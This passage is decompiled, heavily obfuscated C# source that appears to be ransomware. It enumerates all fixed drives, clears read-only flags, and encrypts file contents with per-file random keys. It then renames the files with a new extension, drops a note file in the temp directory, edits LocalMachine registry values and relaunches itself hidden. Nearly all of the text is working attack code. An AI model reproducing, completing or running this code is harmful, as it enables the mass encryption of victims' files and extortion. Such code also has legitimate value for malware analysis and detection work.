		catch (Exception)
		{
		}
	}

	public static void RjBFaRPANuAeBY()
	{
		string string_ = oskmnSWYALtpc(getString_0(107392875));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(KfBmpaPpRy(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(KfBmpaPpRy(getString_0(107392762)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void StHhFdwZgorfORBp()
	{
		abIlhrbbxQowQH(getString_0(107397162), KfBmpaPpRy(getString_0(107392729)));
		string text = KfBmpaPpRy(getString_0(107393047));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107392982) + text + getString_0(107392982) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397162);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void nnDUfvPemlz(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (zObGGMIceXoVAZ)
			{
				try
				{
					File.AppendAllText(nzrzeINFdi, getString_0(107392977) + string_0 + getString_0(107393000) + ex.Message + getString_0(107396591));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string KqilAqOxbJnylCSb()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107395092);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107392879);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107392934))) ? getString_0(107392884) : getString_0(107392925));
				break;
			case 0:
				text = getString_0(107392939);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107392906);
				break;
			case 4:
				text = getString_0(107392893);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107392363) : getString_0(107392340));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107392307) : getString_0(107392312)) : getString_0(107392349)) : getString_0(107392358));
				break;
			case 10:
				text = getString_0(107392302);
				break;
			}
		}
		if (text != getString_0(107395092))
		{
			text = getString_0(107392329) + text;
			if (oSVersion.ServicePack != getString_0(107395092))
			{
				text = text + getString_0(107392316) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string nxdOmCYJoPU(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395269);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395236)));
				streamWriter.WriteLine(getString_0(107396591));
				streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395590)));
				streamWriter.WriteLine(string_0);
				if (xPtaINcBZjHD)
				{
					streamWriter.WriteLine(getString_0(107396591));
					streamWriter.WriteLine(KfBmpaPpRy(getString_0(107395448)));
					streamWriter.WriteLine(OtanrfhnzOcptTQBO.ZmCQYDHnCyhy());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !RoDeoCKBnUdhS)
				{
					File.AppendAllText(text, getString_0(107394903) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (zObGGMIceXoVAZ)
			{
				try
				{
					File.AppendAllText(nzrzeINFdi, getString_0(107392279) + ex.Message + getString_0(107396591));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void uxKbexEDJxt(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		UfneJPKmcXGsZ.wXiAedkquQTqJ CS_0024_003C_003E8__locals0 = new UfneJPKmcXGsZ();
		CS_0024_003C_003E8__locals0.wrxrDZCpVpM = string_1;
		CS_0024_003C_003E8__locals0.jSPQJJgGeg = string_2;
		CS_0024_003C_003E8__locals0.pmOSsYEwCjh = string_3;
		CS_0024_003C_003E8__locals0.yCiuSQiAWEU = string_4;
		PbrXnMMGEpFUDsS = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pmOSsYEwCjh);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395864))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !AVtexYHLTL.Contains(array[i].Name))
					{
						AVtexYHLTL.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!AVtexYHLTL.Contains(string_0[j]))
				{
					AVtexYHLTL.Add(string_0[j]);
				}
			}
		}
		if (AVtexYHLTL.Contains(KfBmpaPpRy(getString_0(107392254))) && TvQOhOYJDM == getString_0(107396765))
		{
			AVtexYHLTL.Remove(KfBmpaPpRy(getString_0(107392254)));
		}
		Parallel.ForEach(AVtexYHLTL, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new UfneJPKmcXGsZ.wXiAedkquQTqJ();
			CS_0024_003C_003E8__locals0.SFiNojbEAyy = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ = string_0;
			if (ZqCAqHfWvbFF && !KqilAqOxbJnylCSb().Contains(UfneJPKmcXGsZ.getString_0(107392372)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						PfklXCmYiYi(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (vRguZFjQqPE == UfneJPKmcXGsZ.getString_0(107396774))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					noFLAUmckMbzvzH(CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ, CS_0024_003C_003E8__locals0.SFiNojbEAyy.wrxrDZCpVpM, CS_0024_003C_003E8__locals0.SFiNojbEAyy.yCiuSQiAWEU, CS_0024_003C_003E8__locals0.SFiNojbEAyy.jSPQJJgGeg, CS_0024_003C_003E8__locals0.SFiNojbEAyy.pmOSsYEwCjh);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				noFLAUmckMbzvzH(CS_0024_003C_003E8__locals0.ZsGFAKiUGeqZ, CS_0024_003C_003E8__locals0.wrxrDZCpVpM, CS_0024_003C_003E8__locals0.yCiuSQiAWEU, CS_0024_003C_003E8__locals0.jSPQJJgGeg, CS_0024_003C_003E8__locals0.pmOSsYEwCjh);
			}
		});
	}

	public static void noFLAUmckMbzvzH(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107395092));
		List<string> list3 = list2;
		if (VJtZoDtDriMd == getString_0(107396770))
		{
			list = yeZMoafCBlpRLv(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = hBZmhuRtAPH.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((LhfSrEuWtmc == getString_0(107396770) && !item.EndsWith(text)) || WBtfQTDigGvEr.Contains(item))
				{
					continue;
				}
				if (HgiayPeKZIFbQY == getString_0(107396765))
				{
					try
					{
						if (EmnCHwZWHQrr.XSYtYWGRMmEpa(item))
						{
							EmnCHwZWHQrr.FOCwwURjqSYijRv(item);
						}
					}
					catch
					{
					}
				}
				WBtfQTDigGvEr.Add(item);
				if (!CarZQGMNGUm.Contains(Path.GetDirectoryName(item)))
				{
					CarZQGMNGUm.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (JXFCxCiyhWYLpp == getString_0(107396765) && fileStream.Length > Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024 && !list3.Contains(text))
					{
						if (rfxQznDDZcfw == getString_0(107396765))
						{
							foreach (string item2 in hVXoeTbUUaWy)
							{
								if (item.ToLower().EndsWith(item2) && nPOfuoWjdBEJXWdYO == getString_0(107396765))
								{
									if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && nPOfuoWjdBEJXWdYO == getString_0(107396770))
								{
									try
									{
										OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(getString_0(107394693), getString_0(107394688), getString_0(107395155), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = pztwxceNvBEECh.gvGKdDcaUqNYg(item, Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024);
						byte[] qOqKYvDIyDIVu = pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						pztwxceNvBEECh.LtuLFdTpnGb(item, qOqKYvDIyDIVu);
						if (string_2 != getString_0(107392213))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107392213))
					{
						FcZiYHRxZD(item, item + string_2, PbrXnMMGEpFUDsS);
					}
					else
					{
						FcZiYHRxZD(item, item + getString_0(107392208), PbrXnMMGEpFUDsS);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void UWZimtrDaOxqycE(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		QJcgVBxUsCEC.BHXZMKqkMA CS_0024_003C_003E8__locals0 = new QJcgVBxUsCEC();
		CS_0024_003C_003E8__locals0.jeTEtaMYQQ = list_0;
		CS_0024_003C_003E8__locals0.FYzxAexoqJ = string_1;
		CS_0024_003C_003E8__locals0.BdIZrOwRALjd = string_2;
		CS_0024_003C_003E8__locals0.cCZPkZyYefOPII = string_3;
		CS_0024_003C_003E8__locals0.NKWSHTwvInRp = new List<string> { getString_0(107395092) };
		if (LhfSrEuWtmc == getString_0(107396770))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.jeTEtaMYQQ)
				{
					if (CS_0024_003C_003E8__locals0.BdIZrOwRALjd.Length != 0)
					{
						string[] bdIZrOwRALjd2 = CS_0024_003C_003E8__locals0.BdIZrOwRALjd;
						int num2 = 0;
						while (num2 < bdIZrOwRALjd2.Length)
						{
							string value2 = bdIZrOwRALjd2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.FYzxAexoqJ))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !WBtfQTDigGvEr.Contains(item))
					{
						if (HgiayPeKZIFbQY == QJcgVBxUsCEC.getString_0(107396782))
						{
							try
							{
								if (EmnCHwZWHQrr.XSYtYWGRMmEpa(item))
								{
									EmnCHwZWHQrr.FOCwwURjqSYijRv(item);
								}
							}
							catch
							{
							}
						}
						WBtfQTDigGvEr.Add(item);
						if (!CarZQGMNGUm.Contains(Path.GetDirectoryName(item)))
						{
							CarZQGMNGUm.Add(Path.GetDirectoryName(item));
						}
						nnDUfvPemlz(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (zObGGMIceXoVAZ)
								{
									try
									{
										File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + item + QJcgVBxUsCEC.getString_0(107409691) + ex12.Message + QJcgVBxUsCEC.getString_0(107396608));
									}
									catch (Exception)
									{
									}
								}
								ZKtLKJvwOV++;
								goto end_IL_00ee_2;
							}
							if (JXFCxCiyhWYLpp == QJcgVBxUsCEC.getString_0(107396782) && new FileInfo(item).Length > Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.NKWSHTwvInRp.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new QJcgVBxUsCEC.zSfJzmFrTZL();
								CS_0024_003C_003E8__locals0.TvmAypQFomSId = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
									{
										if (xPtaINcBZjHD)
										{
											CS_0024_003C_003E8__locals0.FYzxAexoqJ = tvMzMsATBRq + CS_0024_003C_003E8__locals0.FYzxAexoqJ;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.FYzxAexoqJ);
									}
								}
								catch (Exception ex14)
								{
									if (zObGGMIceXoVAZ)
									{
										try
										{
											File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + item + QJcgVBxUsCEC.getString_0(107409598) + ex14.Message + QJcgVBxUsCEC.getString_0(107396608));
										}
										catch (Exception)
										{
										}
									}
									ZKtLKJvwOV++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.BIihmeVwFtm = QJcgVBxUsCEC.getString_0(107395109);
								if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
								{
									CS_0024_003C_003E8__locals0.BIihmeVwFtm = item + CS_0024_003C_003E8__locals0.FYzxAexoqJ;
								}
								else
								{
									CS_0024_003C_003E8__locals0.BIihmeVwFtm = item;
								}
								if (rfxQznDDZcfw == QJcgVBxUsCEC.getString_0(107396782))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in hVXoeTbUUaWy)
										{
											if (CS_0024_003C_003E8__locals0.BIihmeVwFtm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.TvmAypQFomSId.FYzxAexoqJ) && nPOfuoWjdBEJXWdYO == QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107396785))
											{
												if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BIihmeVwFtm).Length)
												{
													try
													{
														OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107394713), QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107394708), QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107395175), CS_0024_003C_003E8__locals0.BIihmeVwFtm);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.BIihmeVwFtm.ToLower().EndsWith(item2) && nPOfuoWjdBEJXWdYO == QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107396790))
											{
												try
												{
													OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107394713), QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107394708), QJcgVBxUsCEC.zSfJzmFrTZL.getString_0(107395175), CS_0024_003C_003E8__locals0.BIihmeVwFtm);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
								string s3 = FSXOXhUgBZ.xjZeAJzrGxgor(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = pztwxceNvBEECh.gvGKdDcaUqNYg(CS_0024_003C_003E8__locals0.BIihmeVwFtm, Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024);
								pztwxceNvBEECh.LtuLFdTpnGb(qOqKYvDIyDIVu: (!eccKoyYfSl) ? (RoDeoCKBnUdhS ? pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (RoDeoCKBnUdhS ? nzCLlPCHXLqP.HSujbXnDcqZ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nzCLlPCHXLqP.HSujbXnDcqZ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NuxIUSruribeoZ: CS_0024_003C_003E8__locals0.BIihmeVwFtm, zmckcQUytJzy: bytes3);
							}
							else
							{
								if (xPtaINcBZjHD)
								{
									CS_0024_003C_003E8__locals0.FYzxAexoqJ = tvMzMsATBRq + CS_0024_003C_003E8__locals0.FYzxAexoqJ;
								}
								string text4 = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
								string s4 = FSXOXhUgBZ.xjZeAJzrGxgor(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
								{
									if (!TOGjrVUqPLyQO)
									{
										if (!RoDeoCKBnUdhS)
										{
											NUBwAswciLFT(item, item + CS_0024_003C_003E8__locals0.FYzxAexoqJ, PbrXnMMGEpFUDsS);
										}
										else
										{
											NUBwAswciLFT(item, item + CS_0024_003C_003E8__locals0.FYzxAexoqJ, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!RoDeoCKBnUdhS)
											{
												VMoTmzztMnQLt(item, item + CS_0024_003C_003E8__locals0.FYzxAexoqJ, PbrXnMMGEpFUDsS);
											}
											else
											{
												VMoTmzztMnQLt(item, item + CS_0024_003C_003E8__locals0.FYzxAexoqJ, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (zObGGMIceXoVAZ)
											{
												try
												{
													File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + item + QJcgVBxUsCEC.getString_0(107392248) + ex16.Message + QJcgVBxUsCEC.getString_0(107396608));
												}
												catch (Exception)
												{
												}
											}
											ZKtLKJvwOV++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!TOGjrVUqPLyQO)
								{
									if (!RoDeoCKBnUdhS)
									{
										NUBwAswciLFT(item, item + QJcgVBxUsCEC.getString_0(107392225), PbrXnMMGEpFUDsS);
									}
									else
									{
										NUBwAswciLFT(item, item + QJcgVBxUsCEC.getString_0(107392225), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!RoDeoCKBnUdhS)
										{
											VMoTmzztMnQLt(item, item, PbrXnMMGEpFUDsS);
										}
										else
										{
											VMoTmzztMnQLt(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (zObGGMIceXoVAZ)
										{
											try
											{
												File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + item + QJcgVBxUsCEC.getString_0(107392248) + ex18.Message + QJcgVBxUsCEC.getString_0(107396608));
											}
											catch (Exception)
											{
											}
										}
										ZKtLKJvwOV++;
										goto end_IL_00ee_2;
									}
								}
								if (RoDeoCKBnUdhS)
								{
									if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
									{
										NebQHReckdpj(item + CS_0024_003C_003E8__locals0.FYzxAexoqJ, bytes4);
									}
									else
									{
										NebQHReckdpj(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.jeTEtaMYQQ.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.jeTEtaMYQQ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new QJcgVBxUsCEC.BHXZMKqkMA();
			CS_0024_003C_003E8__locals0.TvmAypQFomSId = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.oDbjaiuffOt = string_0;
			if (CS_0024_003C_003E8__locals0.BdIZrOwRALjd.Length != 0)
			{
				string[] bdIZrOwRALjd = CS_0024_003C_003E8__locals0.BdIZrOwRALjd;
				int num = 0;
				while (num < bdIZrOwRALjd.Length)
				{
					string value = bdIZrOwRALjd[num];
					if (!CS_0024_003C_003E8__locals0.oDbjaiuffOt.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.oDbjaiuffOt.EndsWith(CS_0024_003C_003E8__locals0.FYzxAexoqJ))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!WBtfQTDigGvEr.Contains(CS_0024_003C_003E8__locals0.oDbjaiuffOt))
			{
				if (HgiayPeKZIFbQY == QJcgVBxUsCEC.getString_0(107396782))
				{
					try
					{
						if (EmnCHwZWHQrr.XSYtYWGRMmEpa(CS_0024_003C_003E8__locals0.oDbjaiuffOt))
						{
							EmnCHwZWHQrr.FOCwwURjqSYijRv(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
						}
					}
					catch
					{
					}
				}
				WBtfQTDigGvEr.Add(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
				if (!CarZQGMNGUm.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oDbjaiuffOt)))
				{
					CarZQGMNGUm.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oDbjaiuffOt));
				}
				nnDUfvPemlz(CS_0024_003C_003E8__locals0.oDbjaiuffOt);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.oDbjaiuffOt).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (zObGGMIceXoVAZ)
						{
							try
							{
								File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + QJcgVBxUsCEC.getString_0(107409691) + ex2.Message + QJcgVBxUsCEC.getString_0(107396608));
							}
							catch (Exception)
							{
							}
						}
						ZKtLKJvwOV++;
						goto end_IL_0117_2;
					}
					if (JXFCxCiyhWYLpp == QJcgVBxUsCEC.getString_0(107396782) && new FileInfo(CS_0024_003C_003E8__locals0.oDbjaiuffOt).Length > Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
							{
								if (xPtaINcBZjHD)
								{
									CS_0024_003C_003E8__locals0.FYzxAexoqJ = tvMzMsATBRq + CS_0024_003C_003E8__locals0.FYzxAexoqJ;
								}
								File.Move(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + CS_0024_003C_003E8__locals0.FYzxAexoqJ);
							}
						}
						catch (Exception ex4)
						{
							if (zObGGMIceXoVAZ)
							{
								try
								{
									File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + QJcgVBxUsCEC.getString_0(107409598) + ex4.Message + QJcgVBxUsCEC.getString_0(107396608));
								}
								catch (Exception)
								{
								}
							}
							ZKtLKJvwOV++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
						{
							CS_0024_003C_003E8__locals0.oDbjaiuffOt += CS_0024_003C_003E8__locals0.FYzxAexoqJ;
						}
						if (rfxQznDDZcfw == QJcgVBxUsCEC.getString_0(107396782))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in hVXoeTbUUaWy)
								{
									if (CS_0024_003C_003E8__locals0.oDbjaiuffOt.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.TvmAypQFomSId.FYzxAexoqJ) && nPOfuoWjdBEJXWdYO == QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107396788))
									{
										if (Convert.ToInt32(YPZutdATMurXqcQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.oDbjaiuffOt).Length)
										{
											try
											{
												OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107394716), QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107394711), QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107395178), CS_0024_003C_003E8__locals0.oDbjaiuffOt);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.oDbjaiuffOt.ToLower().EndsWith(item3) && nPOfuoWjdBEJXWdYO == QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107396793))
									{
										try
										{
											OtanrfhnzOcptTQBO.YuzywFDNbOPuQ(QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107394716), QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107394711), QJcgVBxUsCEC.BHXZMKqkMA.getString_0(107395178), CS_0024_003C_003E8__locals0.oDbjaiuffOt);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
						string s = FSXOXhUgBZ.xjZeAJzrGxgor(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = pztwxceNvBEECh.gvGKdDcaUqNYg(CS_0024_003C_003E8__locals0.oDbjaiuffOt, Convert.ToInt32(raHMniyIxZuJCC) * 1024 * 1024);
						pztwxceNvBEECh.LtuLFdTpnGb(qOqKYvDIyDIVu: (!eccKoyYfSl) ? (RoDeoCKBnUdhS ? pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pztwxceNvBEECh.PrbeKidGGjvRDJA(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (RoDeoCKBnUdhS ? nzCLlPCHXLqP.HSujbXnDcqZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nzCLlPCHXLqP.HSujbXnDcqZ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cCZPkZyYefOPII), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NuxIUSruribeoZ: CS_0024_003C_003E8__locals0.oDbjaiuffOt, zmckcQUytJzy: bytes);
					}
					else
					{
						if (xPtaINcBZjHD)
						{
							CS_0024_003C_003E8__locals0.FYzxAexoqJ = tvMzMsATBRq + CS_0024_003C_003E8__locals0.FYzxAexoqJ;
						}
						string text2 = IsFjAVlCBazD.WvaRyipgtVJgxp(32);
						string s2 = FSXOXhUgBZ.xjZeAJzrGxgor(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.FYzxAexoqJ != QJcgVBxUsCEC.getString_0(107392230))
						{
							if (!TOGjrVUqPLyQO)
							{
								if (!RoDeoCKBnUdhS)
								{
									NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + CS_0024_003C_003E8__locals0.FYzxAexoqJ, PbrXnMMGEpFUDsS);
								}
								else
								{
									NUBwAswciLFT(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + CS_0024_003C_003E8__locals0.FYzxAexoqJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!RoDeoCKBnUdhS)
									{
										VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + CS_0024_003C_003E8__locals0.FYzxAexoqJ, PbrXnMMGEpFUDsS);
									}
									else
									{
										VMoTmzztMnQLt(CS_0024_003C_003E8__locals0.oDbjaiuffOt, CS_0024_003C_003E8__locals0.oDbjaiuffOt + CS_0024_003C_003E8__locals0.FYzxAexoqJ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zObGGMIceXoVAZ)
									{
										try
										{
											File.AppendAllText(nzrzeINFdi, QJcgVBxUsCEC.getString_0(107392994) + CS_0024_003C_003E8__locals0.oDbjaiuffOt + QJcgVBxUsCEC.getString_0(107392248) + ex6.Message + QJcgVBxUsCEC.getString_0(107396608));
										}
										catch (Exception)
										{
										}
									}
									ZKtLKJvwOV++;
									return;
								}
							}
						}
